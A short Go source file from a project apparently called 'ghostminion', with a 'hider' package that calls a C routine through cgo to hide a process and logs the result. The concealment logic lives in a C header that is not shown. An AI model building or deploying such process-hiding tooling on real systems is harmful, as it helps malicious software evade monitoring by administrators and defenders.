package hider

/*
#cgo CFLAGS: -I.
#cgo LDFLAGS:
#include "hider.h"
#include <stdlib.h>
*/
import "C"

import (
	"errors"
	"ghostminion/config"
	"ghostminion/logger"
	"unsafe"
)

var (
	lgr = logger.GetInstance()
	cfg = config.GetInstance()
)

type event struct {
	Pid  uint32
	Comm [16]byte
}

func Hide() error {
	lgr.Debug("Hiding process begins")
	cname := C.CString("")
	defer C.free(unsafe.Pointer(cname))
	ret := C.run_hider(cname)
	if ret != 0 {
		return errors.New("hider encountered an error")
	} else {
		lgr.Info("Hider executed successfully")
	}
	return nil
}
